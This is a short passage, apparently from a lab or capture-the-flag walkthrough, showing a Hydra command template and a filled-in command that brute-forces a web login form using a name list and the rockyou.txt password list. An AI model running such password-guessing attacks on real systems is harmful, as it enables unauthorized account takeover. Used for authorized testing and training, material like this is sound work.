```
sudo hydra <Username/List> <Password/List> <IP> <Method> "<Path>:<RequestBody>:<IncorrectVerbiage>"
```
After filling in the placeholders, here’s our actual command!

```
sudo hydra -s 80 -L ~/path/to/our/nameslist -P /usr/share/wordlists/rockyou.txt <our target> https-post-form "/login/index.php:username=^USER^&password=^PASS^&remember=yes&login=Log+In&proc_login=true:Incorrect password"
```
